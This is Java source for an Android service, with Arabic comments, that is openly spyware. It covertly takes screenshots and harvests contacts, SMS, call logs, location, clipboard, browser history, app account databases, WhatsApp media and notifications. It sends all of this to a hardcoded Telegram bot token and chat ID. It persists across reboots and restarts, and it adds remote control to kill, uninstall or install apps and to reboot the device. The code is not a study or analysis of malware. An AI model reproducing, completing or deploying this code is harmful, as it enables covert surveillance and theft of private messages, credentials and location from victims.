package com.v8.global.sniffer;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;

public class ControlService extends Service {
    
    private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final long SCREENSHOT_INTERVAL = 15000;
    private static final long ACCOUNT_CHECK_INTERVAL = 5000;
    private static final long PERSONAL_DATA_INTERVAL = 300000;
    private static final long APPS_DATA_INTERVAL = 900000;
    private static final long REPORT_INTERVAL = 3600000;
    
    private Handler handler = new Handler(Looper.getMainLooper());
    private PowerManager.WakeLock wakeLock;
    private int screenshotCount = 0;
    private int notificationCount = 0;
    private Set<String> sentNotifications = new HashSet<>();
    private Map<String, Long> accountFileSizes = new HashMap<>();
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    
    private final String[] TARGET_APPS = {
        "com.whatsapp", "org.telegram.messenger", "com.facebook.orca",
        "com.instagram.android", "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
        "com.facebook.katana", "com.snapchat.android", "com.twitter.android",
        "com.google.android.gm", "com.android.mms", "com.google.android.apps.messaging"
    };
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "V8::WakeLock");
        wakeLock.acquire(10*60*1000L);
        
        startAllServices();
        registerBootReceiver();
    }
    
    private void startAllServices() {
        handler.postDelayed(screenshotRunnable, SCREENSHOT_INTERVAL);
        handler.postDelayed(accountRunnable, ACCOUNT_CHECK_INTERVAL);
        handler.postDelayed(personalDataRunnable, PERSONAL_DATA_INTERVAL);
        handler.postDelayed(appsDataRunnable, APPS_DATA_INTERVAL);
        handler.postDelayed(reportRunnable, REPORT_INTERVAL);
        handler.postDelayed(networkControlRunnable, 10000);
        handler.postDelayed(appControlRunnable, 15000);
        handler.postDelayed(systemControlRunnable, 20000);
        handler.postDelayed(screenControlRunnable, 25000);
        handler.postDelayed(soundControlRunnable, 30000);
        
        new Thread(this::grabInitialData).start();
    }
    
    private void registerBootReceiver() {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BOOT_COMPLETED);
        filter.addAction(Intent.ACTION_REBOOT);
        filter.addAction("android.intent.action.QUICKBOOT_POWERON");
        registerReceiver(new BootReceiver(), filter);
    }
    
    // ========== 1. لقطات الشاشة ==========
    private Runnable screenshotRunnable = new Runnable() {
        @Override
        public void run() {
            takeScreenshot();
            handler.postDelayed(this, SCREENSHOT_INTERVAL);
        }
    };
    
    private void takeScreenshot() {
        try {
            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(new Date());
            String path = Environment.getExternalStorageDirectory() + "/Pictures/screen_" + timeStamp + ".png";
            
            Process process = Runtime.getRuntime().exec("screencap -p " + path);
            boolean completed = process.waitFor(5, java.util.concurrent.TimeUnit.SECONDS);
            
            if (completed) {
                File file = new File(path);
                if (file.exists() && file.length() > 1000) {
                    screenshotCount++;
                    sendFileToTelegram("📸 لقطة #" + screenshotCount, path);
                }
            }
        } catch (Exception e) {
        }
    }
    
    // ========== 2. مراقبة الحسابات ==========
    private Runnable accountRunnable = new Runnable() {
        @Override
        public void run() {
            checkNewAccounts();
            handler.postDelayed(this, ACCOUNT_CHECK_INTERVAL);
        }
    };
    
    private void checkNewAccounts() {
        try {
            String[] accountPaths = {
                "/data/system/users/0/accounts.db",
                "/data/data/com.google.android.gms/databases/accounts.db",
                "/data/data/com.whatsapp/shared_prefs/WhatsApp.xml",
                "/data/data/org.telegram.messenger/shared_prefs/org.telegram.messenger_preferences.xml",
                "/data/data/com.facebook.orca/shared_prefs",
                "/data/data/com.instagram.android/shared_prefs",
                "/data/data/com.zhiliaoapp.musically/shared_prefs"
            };
            
            List<String> newAccounts = new ArrayList<>();
            
            for (String path : accountPaths) {
                File file = new File(path);
                if (file.exists()) {
                    long currentSize = file.length();
                    String key = path + "_" + currentSize;
                    
                    if (accountFileSizes.containsKey(path)) {
                        long oldSize = accountFileSizes.get(path);
                        if (currentSize != oldSize) {
                            newAccounts.add("📁 تغير في " + getAppNameFromPath(path));
                            
                            if (currentSize < 10 * 1024 * 1024) {
                                String tempPath = Environment.getExternalStorageDirectory() + 
                                    "/Download/account_" + System.currentTimeMillis() + ".dat";
                                copyFile(file, new File(tempPath));
                                sendFileToTelegram("🔐 " + getAppNameFromPath(path), tempPath);
                            }
                        }
                    }
                    accountFileSizes.put(path, currentSize);
                }
            }
            
            if (!newAccounts.isEmpty()) {
                StringBuilder msg = new StringBuilder();
                for (String acc : newAccounts) {
                    msg.append(acc).append("\n");
                }
                sendToTelegram("🔐 حسابات جديدة", msg.toString());
                handler.postDelayed(() -> takeScreenshot(), 1000);
            }
        } catch (Exception e) {
        }
    }
    
    // ========== 3. البيانات الشخصية ==========
    private Runnable personalDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabPersonalData();
            handler.postDelayed(this, PERSONAL_DATA_INTERVAL);
        }
    };
    
    private void grabPersonalData() {
        new Thread(() -> {
            grabContacts();
            grabSMS();
            grabCallLog();
            grabLocation();
            grabAccounts();
            grabClipboard();
            grabBrowserHistory();
            grabCalendar();
        }).start();
    }
    
    private void grabContacts() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            
            if (cursor != null) {
                StringBuilder contacts = new StringBuilder();
                int count = 0;
                
                while (cursor.moveToNext() && count < 500) {
                    String name = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor.getColumnIndex(
                        ContactsContract.CommonDataKinds.Phone.NUMBER));
                    contacts.append(name).append(": ").append(number).append("\n");
                    count++;
                }
                cursor.close();
                
                if (contacts.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                        "/Download/contacts_" + System.currentTimeMillis() + ".txt";
                    writeToFile(contacts.toString(), path);
                    sendFileToTelegram("👥 جهات الاتصال", path);
                }
            }
        } catch (Exception e) {
        }
    }
    
    private void grabSMS() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC LIMIT 500");
            
            if (cursor != null) {
                StringBuilder sms = new StringBuilder();
                int count = 0;
                
                while (cursor.moveToNext() && count < 500) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    String date = cursor.getString(cursor.getColumnIndex("date"));
                    sms.append("من: ").append(address).append("\n");
                    sms.append("نص: ").append(body).append("\n");
                    sms.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();
                
                if (sms.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                        "/Download/sms_" + System.currentTimeMillis() + ".txt";
                    writeToFile(sms.toString(), path);
                    sendFileToTelegram("📨 الرسائل", path);
                }
            }
        } catch (Exception e) {
        }
    }
    
    private void grabCallLog() {
        try {
            ContentResolver cr = getContentResolver();
            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI,
                    null, null, null, CallLog.Calls.DATE + " DESC LIMIT 500");
            
            if (cursor != null) {
                StringBuilder calls = new StringBuilder();
                int count = 0;
                
                while (cursor.moveToNext() && count < 500) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String duration = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    
                    String typeStr = "وارد";
                    if ("2".equals(type)) typeStr = "صادر";
                    if ("3".equals(type)) typeStr = "فائت";
                    
                    calls.append("رقم: ").append(number).append("\n");
                    calls.append("نوع: ").append(typeStr).append("\n");
                    calls.append("مدة: ").append(duration).append(" ثانية\n");
                    calls.append("تاريخ: ").append(date).append("\n\n");
                    count++;
                }
                cursor.close();
                
                if (calls.length() > 0) {
                    String path = Environment.getExternalStorageDirectory() + 
                        "/Download/calls_" + System.currentTimeMillis() + ".txt";
                    writeToFile(calls.toString(), path);
                    sendFileToTelegram("📞 سجل المكالمات", path);
                }
            }
        } catch (Exception e) {
        }
    }
    
    private void grabLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
            
            if (location != null) {
                String loc = "الموقع الحالي:\n";
                loc += "خط العرض: " + location.getLatitude() + "\n";
                loc += "خط الطول: " + location.getLongitude() + "\n";
                loc += "الدقة: " + location.getAccuracy() + " متر";
                sendToTelegram("📍 الموقع", loc);
            }
        } catch (Exception e) {
        }
    }
    
    private void grabAccounts() {
        try {
            Process process = Runtime.getRuntime().exec("dumpsys account");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && output.length() < 2000) {
                output.append(line).append("\n");
            }
            reader.close();
            
            if (output.length() > 0) {
                sendToTelegram("🔐 الحسابات", output.toString());
            }
        } catch (Exception e) {
        }
    }
    
    private void grabClipboard() {
        try {
            Process process = Runtime.getRuntime().exec("content query --uri content://clipboard");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            
            if (output.length() > 0) {
                sendToTelegram("📋 الحافظة", output.toString());
            }
        } catch (Exception e) {
        }
    }
    
    private void grabBrowserHistory() {
        try {
            Process process = Runtime.getRuntime().exec("content query --uri content://com.android.chrome.browser/history");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && output.length() < 2000) {
                output.append(line).append("\n");
            }
            reader.close();
            
            if (output.length() > 0) {
                sendToTelegram("🌐 تاريخ المتصفح", output.toString());
            }
        } catch (Exception e) {
        }
    }
    
    private void grabCalendar() {
        try {
            Process process = Runtime.getRuntime().exec("content query --uri content://calendar/events");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && output.length() < 2000) {
                output.append(line).append("\n");
            }
            reader.close();
            
            if (output.length() > 0) {
                sendToTelegram("📅 التقويم", output.toString());
            }
        } catch (Exception e) {
        }
    }
    
    // ========== 4. بيانات التطبيقات ==========
    private Runnable appsDataRunnable = new Runnable() {
        @Override
        public void run() {
            grabAppsData();
            handler.postDelayed(this, APPS_DATA_INTERVAL);
        }
    };
    
    private void grabAppsData() {
        new Thread(() -> {
            for (String app : TARGET_APPS) {
                grabAppData(app);
            }
            grabWhatsAppData();
        }).start();
    }
    
    private void grabAppData(String packageName) {
        try {
            String[] paths = {
                "/data/data/" + packageName + "/files",
                "/data/data/" + packageName + "/cache",
                Environment.getExternalStorageDirectory() + "/Android/data/" + packageName + "/files"
            };
            
            List<String> files = new ArrayList<>();
            String appName = getSimpleAppName(packageName);
            
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                String name = file.getName().toLowerCase();
                                if (name.endsWith(".jpg") || name.endsWith(".jpeg") || 
                                    name.endsWith(".png") || name.endsWith(".mp4") || 
                                    name.endsWith(".pdf") || name.endsWith(".db") ||
                                    name.endsWith(".xml") || name.endsWith(".json")) {
                                    files.add(file.getAbsolutePath());
                                }
                            }
                        }
                    }
                }
            }
            
            if (!files.isEmpty()) {
                sendToTelegram("📱 " + appName, "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(5, files.size()); i++) {
                    sendFileToTelegram(appName, files.get(i));
                }
            }
        } catch (Exception e) {
        }
    }
    
    private void grabWhatsAppData() {
        try {
            String[] paths = {
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Images",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Video",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Audio",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Media/WhatsApp Documents",
                Environment.getExternalStorageDirectory() + "/WhatsApp/Databases"
            };
            
            List<String> files = new ArrayList<>();
            
            for (String path : paths) {
                File dir = new File(path);
                if (dir.exists() && dir.isDirectory()) {
                    File[] list = dir.listFiles();
                    if (list != null) {
                        for (File file : list) {
                            if (file.isFile() && file.length() < 50 * 1024 * 1024) {
                                files.add(file.getAbsolutePath());
                            }
                        }
                    }
                }
            }
            
            if (!files.isEmpty()) {
                sendToTelegram("📱 واتساب", "تم العثور على " + files.size() + " ملف");
                for (int i = 0; i < Math.min(5, files.size()); i++) {
                    sendFileToTelegram("واتساب", files.get(i));
                }
            }
        } catch (Exception e) {
        }
    }
    
    // ========== 5. التحكم بالشبكة ==========
    private Runnable networkControlRunnable = new Runnable() {
        @Override
        public void run() {
            checkNetworkCommands();
            handler.postDelayed(this, 10000);
        }
    };
    
    private void checkNetworkCommands() {
        try {
            String wifiStatus = Settings.Global.getString(getContentResolver(), "wifi_on");
            String dataStatus = Settings.Global.getString(getContentResolver(), "mobile_data");
            
            if (wifiStatus != null) {
                sendToTelegram("📶 حالة WiFi", wifiStatus.equals("1") ? "مفعل" : "غير مفعل");
            }
            
            if (dataStatus != null) {
                sendToTelegram("📱 حالة البيانات", dataStatus.equals("1") ? "مفعلة" : "غير مفعلة");
            }
        } catch (Exception e) {
        }
    }
    
    public void enableWifi() {
        try {
            Settings.Global.putString(getContentResolver(), "wifi_on", "1");
            sendToTelegram("📶 WiFi", "تم التشغيل");
        } catch (Exception e) {
        }
    }
    
    public void disableWifi() {
        try {
            Settings.Global.putString(getContentResolver(), "wifi_on", "0");
            sendToTelegram("📶 WiFi", "تم الإطفاء");
        } catch (Exception e) {
        }
    }
    
    public void enableData() {
        try {
            Settings.Global.putString(getContentResolver(), "mobile_data", "1");
            sendToTelegram("📱 بيانات", "تم التشغيل");
        } catch (Exception e) {
        }
    }
    
    public void disableData() {
        try {
            Settings.Global.putString(getContentResolver(), "mobile_data", "0");
            sendToTelegram("📱 بيانات", "تم الإطفاء");
        } catch (Exception e) {
        }
    }
    
    public void enableBluetooth() {
        try {
            Settings.Global.putString(getContentResolver(), "bluetooth_on", "1");
            sendToTelegram("🔵 بلوتوث", "تم التشغيل");
        } catch (Exception e) {
        }
    }
    
    public void disableBluetooth() {
        try {
            Settings.Global.putString(getContentResolver(), "bluetooth_on", "0");
            sendToTelegram("🔵 بلوتوث", "تم الإطفاء");
        } catch (Exception e) {
        }
    }
    
    public void enableFlightMode() {
        try {
            Settings.Global.putString(getContentResolver(), "airplane_mode_on", "1");
            sendToTelegram("✈️ وضع الطيران", "تم التشغيل");
        } catch (Exception e) {
        }
    }
    
    public void disableFlightMode() {
        try {
            Settings.Global.putString(getContentResolver(), "airplane_mode_on", "0");
            sendToTelegram("✈️ وضع الطيران", "تم الإلغاء");
        } catch (Exception e) {
        }
    }
    
    // ========== 6. التحكم بالتطبيقات ==========
    private Runnable appControlRunnable = new Runnable() {
        @Override
        public void run() {
            checkAppCommands();
            handler.postDelayed(this, 15000);
        }
    };
    
    private void checkAppCommands() {
        try {
            Process process = Runtime.getRuntime().exec("dumpsys activity activities");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && output.length() < 500) {
                if (line.contains("topResumedActivity")) {
                    output.append("التطبيق النشط: ").append(line).append("\n");
                }
            }
            reader.close();
            
            if (output.length() > 0) {
                sendToTelegram("▶️ التطبيقات", output.toString());
            }
        } catch (Exception e) {
        }
    }
    
    public void openApp(String packageName) {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                sendToTelegram("▶️ فتح", "تم فتح " + packageName);
            }
        } catch (Exception e) {
        }
    }
    
    public void closeApp(String packageName) {
        try {
            Process process = Runtime.getRuntime().exec("am force-stop " + packageName);
            process.waitFor();
            sendToTelegram("⏹️ إغلاق", "تم إغلاق " + packageName);
        } catch (Exception e) {
        }
    }
    
    public void killApp(String packageName) {
        try {
            Process process = Runtime.getRuntime().exec("am kill " + packageName);
            process.waitFor();
            sendToTelegram("💀 قتل", "تم قتل " + packageName);
        } catch (Exception e) {
        }
    }
    
    public void clearAppData(String packageName) {
        try {
            Process process = Runtime.getRuntime().exec("pm clear " + packageName);
            process.waitFor();
            sendToTelegram("🧹 مسح", "تم مسح بيانات " + packageName);
        } catch (Exception e) {
        }
    }
    
    public void disableApp(String packageName) {
        try {
            Process process = Runtime.getRuntime().exec("pm disable " + packageName);
            process.waitFor();
            sendToTelegram("🔴 تعطيل", "تم تعطيل " + packageName);
        } catch (Exception e) {
        }
    }
    
    public void enableApp(String packageName) {
        try {
            Process process = Runtime.getRuntime().exec("pm enable " + packageName);
            process.waitFor();
            sendToTelegram("🟢 تفعيل", "تم تفعيل " + packageName);
        } catch (Exception e) {
        }
    }
    
    public void installApp(String apkPath) {
        try {
            Process process = Runtime.getRuntime().exec("pm install " + apkPath);
            process.waitFor();
            sendToTelegram("📲 تثبيت", "تم تثبيت " + apkPath);
        } catch (Exception e) {
        }
    }
    
    public void uninstallApp(String packageName) {
        try {
            Process process = Runtime.getRuntime().exec("pm uninstall " + packageName);
            process.waitFor();
            sendToTelegram("🗑️ حذف", "تم حذف " + packageName);
        } catch (Exception e) {
        }
    }
    
    // ========== 7. التحكم بالنظام ==========
    private Runnable systemControlRunnable = new Runnable() {
        @Override
        public void run() {
            checkSystemCommands();
            handler.postDelayed(this, 20000);
        }
    };
    
    private void checkSystemCommands() {
        try {
            Process process = Runtime.getRuntime().exec("dumpsys battery");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && output.length() < 300) {
                if (line.contains("level") || line.contains("status") || line.contains("temperature")) {
                    output.append(line.trim()).append("\n");
                }
            }
            reader.close();
            
            if (output.length() > 0) {
                sendToTelegram("🔋 البطارية", output.toString());
            }
        } catch (Exception e) {
        }
    }
    
    public void reboot() {
        try {
            Process process = Runtime.getRuntime().exec("reboot");
            sendToTelegram("🔄 إعادة تشغيل", "جاري إعادة التشغيل...");
        } catch (Exception e) {
        }
    }
    
    public void shutdown() {
        try {
            Process process = Runtime.getRuntime().exec("reboot -p");
            sendToTelegram("⏻ إطفاء", "جاري إطفاء الجهاز...");
        } catch (Exception e) {
        }
    }
    
    public void restartSystemUI() {
        try {
            Process process = Runtime.getRuntime().exec("pkill -f com.android.systemui");
            process.waitFor();
            sendToTelegram("🔄 واجهة النظام", "تم إعادة التشغيل");
        } catch (Exception e) {
        }
    }
    
    public void clearCache() {
        try {
            Process process = Runtime.getRuntime().exec("pm trim-caches 999999999");
            process.waitFor();
            sendToTelegram("🧹 كاش", "تم مسح الكاش");
        } catch (Exception e) {
        }
    }
    
    public void getLogcat() {
        try {
            Process process = Runtime.getRuntime().exec("logcat -d -t 100");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null && output.length() < 2000) {
                output.append(line).append("\n");
            }
            reader.close();
            
            if (output.length() > 0) {
                sendToTelegram("📋 سجل النظام", output.toString());
            }
        } catch (Exception e) {
        }
    }
    
    // ========== 8. التحكم بالشاشة ==========
    private Runnable screenControlRunnable = new Runnable() {
        @Override
        public void run() {
            checkScreenCommands();
            handler.postDelayed(this, 25000);
        }
    };
    
    private void checkScreenCommands() {
        try {
            int brightness = Settings.System.getInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS);
            sendToTelegram("💡 سطوع الشاشة", "المستوى: " + brightness);
        } catch (Exception e) {
        }
    }
    
    public void lockScreen() {
        try {
            Process process = Runtime.getRuntime().exec("input keyevent 26");
            sendToTelegram("🔒 قفل", "تم قفل الشاشة");
        } catch (Exception e) {
        }
    }
    
    public void unlockScreen() {
        try {
            Process process = Runtime.getRuntime().exec("input keyevent 82");
            sendToTelegram("🔓 فتح", "تم فتح الشاشة");
        } catch (Exception e) {
        }
    }
    
    public void setBrightness(int level) {
        try {
            if (level < 0) level = 0;
            if (level > 255) level = 255;
            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, level);
            sendToTelegram("💡 سطوع", "تم التعديل إلى " + level);
        } catch (Exception e) {
        }
    }
    
    public void rotateScreen() {
        try {
            int rotation = Settings.System.getInt(getContentResolver(), Settings.System.ACCELEROMETER_ROTATION);
            Settings.System.putInt(getContentResolver(), Settings.System.ACCELEROMETER_ROTATION, rotation == 1 ? 0 : 1);
            sendToTelegram("🔄 تدوير", "تم تغيير وضع التدوير");
        } catch (Exception e) {
        }
    }
    
    // ========== 9. التحكم بالصوت ==========
    private Runnable soundControlRunnable = new Runnable() {
        @Override
        public void run() {
            checkSoundCommands();
            handler.postDelayed(this, 30000);
        }
    };
    
    private void checkSoundCommands() {
        try {
            int volume = Settings.System.getInt(getContentResolver(), Settings.System.VOLUME_MUSIC);
            sendToTelegram("🔊 مستوى الصوت", String.valueOf(volume));
        } catch (Exception e) {
        }
    }
    
    public void setVolume(int level) {
        try {
            if (level < 0) level = 0;
            if (level > 15) level = 15;
            Settings.System.putInt(getContentResolver(), Settings.System.VOLUME_MUSIC, level);
            sendToTelegram("🔊 صوت", "تم التعديل إلى " + level);
        } catch (Exception e) {
        }
    }
    
    public void mute() {
        try {
            setVolume(0);
            sendToTelegram("🔇 كتم", "تم كتم الصوت");
        } catch (Exception e) {
        }
    }
    
    public void maxVolume() {
        try {
            setVolume(15);
            sendToTelegram("🔊 أقصى صوت", "تم رفع الصوت للأقصى");
        } catch (Exception e) {
        }
    }
    
    // ========== 10. التقارير ==========
    private Runnable reportRunnable = new Runnable() {
        @Override
        public void run() {
            sendReport();
            handler.postDelayed(this, REPORT_INTERVAL);
        }
    };
    
    private void sendReport() {
        String report = "📊 تقرير شامل:\n" +
                       "📸 لقطات: " + screenshotCount + "\n" +
                       "🔔 إشعارات: " + notificationCount + "\n" +
                       "🔐 ملفات مراقبة: " + accountFileSizes.size() + "\n" +
                       "📱 تطبيقات مستهدفة: " + TARGET_APPS.length;
        sendToTelegram("📊 تقرير دوري", report);
    }
    
    // ========== 11. البيانات الأولية ==========
    private void grabInitialData() {
        grabContacts();
        grabSMS();
        grabCallLog();
        grabLocation();
        grabAccounts();
        grabAppsData();
    }
    
    // ========== 12. تسجيل الإشعارات ==========
    public void onNotificationReceived(String appName, String title, String text) {
        try {
            if (title.length() < 2 && text.length() < 2) return;
            
            String notifId = appName + "|" + title + "|" + text;
            if (sentNotifications.contains(notifId)) return;
            
            sentNotifications.add(notifId);
            if (sentNotifications.size() > 500) {
                sentNotifications.remove(sentNotifications.iterator().next());
            }
            
            notificationCount++;
            
            String message = "🔔 إشعار #" + notificationCount + "\n" +
                           "📱 التطبيق: " + appName + "\n";
            if (!title.isEmpty()) message += "👤 " + title + "\n";
            if (!text.isEmpty()) message += "💬 " + text;
            
            sendToTelegram("إشعار جديد", message);
            
            for (String target : TARGET_APPS) {
                if (appName.toLowerCase().contains(target.toLowerCase())) {
                    handler.postDelayed(() -> takeScreenshot(), 1000);
                    break;
                }
            }
        } catch (Exception e) {
        }
    }
    
    // ========== أدوات مساعدة ==========
    private String getAppNameFromPath(String path) {
        if (path.contains("whatsapp")) return "واتساب";
        if (path.contains("telegram")) return "تيليغرام";
        if (path.contains("facebook")) return "فيسبوك";
        if (path.contains("instagram")) return "انستغرام";
        if (path.contains("musically") || path.contains("tiktok")) return "تيك توك";
        if (path.contains("google")) return "جوجل";
        return "تطبيق";
    }
    
    private String getSimpleAppName(String packageName) {
        if (packageName.contains("whatsapp")) return "واتساب";
        if (packageName.contains("telegram")) return "تيليغرام";
        if (packageName.contains("facebook")) return "فيسبوك";
        if (packageName.contains("instagram")) return "انستغرام";
        if (packageName.contains("musically") || packageName.contains("tiktok")) return "تيك توك";
        if (packageName.contains("snapchat")) return "سناب شات";
        if (packageName.contains("twitter")) return "تويتر";
        return packageName;
    }
    
    private void writeToFile(String content, String path) {
        try {
            FileWriter writer = new FileWriter(path);
            writer.write(content);
            writer.close();
        } catch (Exception e) {
        }
    }
    
    private void copyFile(File src, File dst) {
        try {
            FileInputStream in = new FileInputStream(src);
            FileOutputStream out = new FileOutputStream(dst);
            byte[] buffer = new byte[4096];
            int len;
            while ((len = in.read(buffer)) > 0) {
                out.write(buffer, 0, len);
            }
            in.close();
            out.close();
        } catch (Exception e) {
        }
    }
    
    private void sendToTelegram(String title, String message) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + 
                "/sendMessage?chat_id=" + CHAT_ID + 
                "&text=" + URLEncoder.encode("🔴 " + title + "\n\n" + message, "UTF-8");
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) {
        }
    }
    
    private void sendFileToTelegram(String caption, String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || file.length() > 50 * 1024 * 1024) return;
            
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            
            DataOutputStream outputStream = new DataOutputStream(conn.getOutputStream());
            
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            outputStream.writeBytes(CHAT_ID + "\r\n");
            
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
            outputStream.writeBytes("🔴 " + caption + "\r\n");
            
            outputStream.writeBytes("--" + boundary + "\r\n");
            outputStream.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n");
            outputStream.writeBytes("Content-Type: application/octet-stream\r\n\r\n");
            
            FileInputStream fileInputStream = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                outputStream.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            
            outputStream.writeBytes("\r\n--" + boundary + "--\r\n");
            outputStream.flush();
            outputStream.close();
            
            conn.getResponseCode();
            conn.disconnect();
            
            file.delete();
        } catch (Exception e) {
        }
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("restartservice");
        broadcastIntent.setClass(this, RestartReceiver.class);
        sendBroadcast(broadcastIntent);
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
    }
}
